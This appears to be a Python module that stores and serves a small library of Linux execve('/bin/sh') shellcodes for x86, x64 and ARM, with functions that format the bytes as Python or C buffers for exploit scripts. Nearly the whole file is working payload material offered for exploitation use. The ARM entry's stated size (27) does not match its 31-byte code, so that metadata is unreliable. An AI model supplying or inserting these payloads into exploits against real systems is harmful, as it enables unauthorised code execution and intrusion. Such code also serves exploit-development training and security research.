from typing import Dict, List, Optional

class ShellcodeManager:
    """
    Manages a library of common shellcodes for binary exploitation.
    """

    def __init__(self):
        self.shellcodes = {
            'linux_x86_execve': {
                'name': 'Linux x86 execve("/bin/sh")',
                'arch': 'x86',
                'os': 'linux',
                'size': 23,
                'code': b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
                'description': 'Spawns a shell using execve syscall (int 0x80)'
            },
            'linux_x64_execve': {
                'name': 'Linux x64 execve("/bin/sh")',
                'arch': 'x64',
                'os': 'linux',
                'size': 27,
                'code': b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05',
                'description': 'Spawns a shell using execve syscall (syscall)'
            },
            'linux_x64_execve_short': {
                'name': 'Linux x64 execve("/bin/sh") [Short]',
                'arch': 'x64',
                'os': 'linux',
                'size': 24,
                'code': b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05',
                'description': 'Compact 24-byte shellcode for x64'
            },
            'linux_arm_execve': {
                'name': 'Linux ARM execve("/bin/sh")',
                'arch': 'arm',
                'os': 'linux',
                'size': 27,
                'code': b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68',
                'description': 'Thumb mode execve shellcode'
            }
        }

    def list_shellcodes(self, arch: Optional[str] = None) -> List[Dict]:
        """
        List available shellcodes, optionally filtered by architecture.
        
        Args:
            arch: Architecture to filter by (x86, x64, arm)
            
        Returns:
            List of shellcode dictionaries
        """
        results = []
        for key, sc in self.shellcodes.items():
            if arch and sc['arch'] != arch:
                continue
            sc_copy = sc.copy()
            sc_copy['id'] = key
            results.append(sc_copy)
        return results

    def get_shellcode(self, shellcode_id: str) -> Optional[bytes]:
        """
        Get raw bytes for a specific shellcode.
        
        Args:
            shellcode_id: ID of the shellcode
            
        Returns:
            Raw bytes or None if not found
        """
        if shellcode_id in self.shellcodes:
            return self.shellcodes[shellcode_id]['code']
        return None

    def format_shellcode(self, shellcode_id: str, format_type: str = 'python') -> str:
        """
        Format shellcode for use in exploits.
        
        Args:
            shellcode_id: ID of the shellcode
            format_type: Output format ('python', 'c', 'hex')
            
        Returns:
            Formatted string
        """
        code = self.get_shellcode(shellcode_id)
        if not code:
            return "Shellcode not found"
            
        if format_type == 'python':
            # b"\x31\xc0..."
            hex_str = "".join([f"\\x{b:02x}" for b in code])
            return f'buf = b"{hex_str}"'
            
        elif format_type == 'c':
            # "\x31\xc0..."
            hex_str = "".join([f"\\x{b:02x}" for b in code])
            return f'char code[] = "{hex_str}";'
            
        elif format_type == 'hex':
            return code.hex()
            
        return "Unknown format"
